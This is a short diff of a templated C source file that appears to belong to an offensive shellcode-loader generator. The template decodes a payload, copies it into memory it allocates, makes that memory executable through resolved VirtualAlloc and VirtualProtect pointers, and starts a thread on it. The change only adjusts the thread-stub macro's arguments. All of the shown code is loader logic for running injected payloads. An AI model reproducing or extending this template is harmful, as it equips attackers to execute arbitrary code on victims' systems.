@@ -14,7 +14,7 @@
         {% if protection == "rx" %}
             VOID *mem = pVirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_READWRITE);
             memcpy(mem, decoded, length);
-            {{ createThreadStub("local", "mem", "mem") }}
+            {{ createThreadStub("mem", "mem") }}
 
             DWORD dwSize;
             pVirtualProtect(mem, length, PAGE_EXECUTE_READ, &dwSize);
@@ -22,7 +22,7 @@
         {% else %}
             VOID *mem = pVirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
             memcpy(mem, decoded, length);
-            {{ createThreadStub("local", "mem", "mem") }}
+            {{ createThreadStub("mem", "mem") }}
             return mem;
         {% endif %}
     }
